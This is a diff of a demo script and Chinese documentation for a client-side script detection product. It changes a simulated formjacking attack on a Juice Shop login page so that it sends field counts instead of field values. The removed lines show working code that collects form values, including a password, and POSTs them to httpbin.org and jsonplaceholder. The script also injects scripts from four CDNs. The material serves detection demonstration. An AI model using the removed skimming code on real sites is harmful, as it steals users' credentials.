@@ -22,12 +22,11 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
     // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
     console.log('\\n[Formjack] Phase 1: Form field harvesting');
     var inputs = document.querySelectorAll('input');
-    var harvested = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+    console.log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
     // Phase 2: Inject third-party scripts from 4 CDN domains
     console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
@@ -50,12 +49,13 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         console.log('[Supply Chain] Injected script tag: ' + cdn.name);
     });
 
-    // Phase 3: Exfiltrate harvested data to external endpoints
+    // Phase 3: Send synthetic counters to external endpoints
     console.log('\\n[Exfil] Phase 3: Data exfiltration');
     var payload = JSON.stringify({
         type: 'combined_demo',
-        credentials: harvested,
-        page: window.location.href,
+        field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true,
         timestamp: Date.now()
     });
 
@@ -64,7 +64,7 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         mode: 'no-cors',
         body: payload
     }).then(function() {
-        console.log('[Exfil] Data sent to www.httpbin.org');
+        console.log('[Exfil] Synthetic signal sent to www.httpbin.org');
     });
 
     fetch('https://jsonplaceholder.typicode.com/posts', {
@@ -73,13 +73,13 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         headers: { 'Content-Type': 'application/json' },
         body: payload
     }).then(function() {
-        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+        console.log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com');
     });
 
     // Summary
     console.log('\\n' + '='.repeat(50));
     console.log('[CSD Demo] Simulation complete');
-    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
     console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
     console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
     console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
@@ -95,7 +95,7 @@ CSD 在浏览器内部监控 JavaScript 行为。与 WAF 或 Bot Defense 不同�
 <Steps>
 1. 在 `https://botdemo.sales-demo.f5demos.com/#/login` 导航至 Juice Shop 的**登录页面**
 
-2. 在表单字段中输入虚假凭据——在 **Email** 字段中输入 `test@example.com`，在 **Password** 字段中输入 `P@ssword123`（不要提交表单）
+2. 在表单字段中输入虚假凭据——在 **Email** 字段中输入 `test@example.com`，在 **Password** 字段中输入 `<DEMO_PASSWORD>`（不要提交表单）
 
 3. 打开 DevTools（**F12** &rarr; **Console** 选项卡）
 
@@ -139,7 +139,7 @@ var _poll = _si(function() {
       window.HTMLInputElement.prototype, 'value').set;
     nativeSet.call(emailEl, 'test@example.com');
     emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
+    nativeSet.call(passEl, '<DEMO_PASSWORD>');
     passEl.dispatchEvent(new Event('input', { bubbles: true }));
 
     // Run Combined Detection Script inline using native fetch for exfil
@@ -150,12 +150,11 @@ var _poll = _si(function() {
 
       _log('\n[Formjack] Phase 1: Form field harvesting');
       var inputs = document.querySelectorAll('input');
-      var harvested = {};
+      var populatedFieldCount = 0;
       inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
       });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
       _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
       var cdns = [
@@ -175,19 +174,20 @@ var _poll = _si(function() {
 
       _log('\n[Exfil] Phase 3: Data exfiltration');
       var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
+        type: 'combined_demo', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
       });
       _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
 
       _log('\n==================================================');
       _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
       _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
       _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
       _log('==================================================');
@@ -220,7 +220,7 @@ var _poll = _si(function() {
 | --- | --- | --- |
 | **字段采集** | 读取现有 `input` 元素（邮箱、密码）的值 | 脚本读取敏感表单字段——标记为高风险 |
 | **脚本注入** | 追加 4 个 `<script>` 标签，从 `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com` 和 `ga.jspm.io` 加载内容 | 页面上出现 4 个新的第三方脚本域 |
-| **数据渗漏** | 通过 `fetch` 将采集的数据发送至 `www.httpbin.org` 和 `jsonplaceholder.typicode.com` | 向外部域发起网络调用（注意：fetch 目标以脚本网络交互形式显示，而非在网络域视图中显示） |
+| **合成网络信号** | 通过 `fetch` 发送字段计数和丢弃标记；字段值绝不进入负载 | 向外部域发起网络调用（注意：fetch 目标以脚本网络交互形式显示，而非在网络域视图中显示） |
 
 <Aside type="note">
 CSD 具有特定的检测边界——例如，仅跟踪页面加载时的 DOM 字段，且网络视图仅显示脚本加载域。请参阅[检测边界](/csd/zh-cn/overview/#detection-boundaries)获取完整列表。
